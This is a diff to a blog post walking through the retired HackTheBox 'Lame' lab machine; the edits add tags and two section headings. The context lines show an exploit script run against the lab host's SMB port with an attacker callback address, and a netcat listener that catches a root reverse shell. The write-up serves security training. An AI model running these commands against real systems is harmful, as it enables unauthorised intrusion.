@@ -2,6 +2,7 @@
 title = 'HackTheBox - Lame'
 date = 2023-09-15T17:03:12+02:00
 draft = false
+tags = 'htb-easy' 'tj_null'
 +++
 
 **Lame** is a beginner level machine, requiring only one exploit to obtain root access. It was the first machine published on Hack The Box and was often the first machine for new users prior to its retirement.
@@ -100,7 +101,7 @@ So in this scenario
 **LPORT** = (we can choose the port we want, in this case i choose 1234) = `1234`
 
 so the command would be 
-
+## Running the exploit
 ```
 python usermap_script.py 10.10.10.3 139 10.10.14.5 1234
 ```
@@ -110,7 +111,7 @@ Before running the command we will run *netcat* listener on port **1234** like t
 ```
 nc -lvnp 1234
 ```
-
+##PoC
 After running the exploit we will get the *reverse shell* as **root**
 
 ![Minion](https://github.com/pepax3/pepax3.github.io/blob/main/content/posts/HackTheBox%20-%20Lame/PoC.png?raw=true)
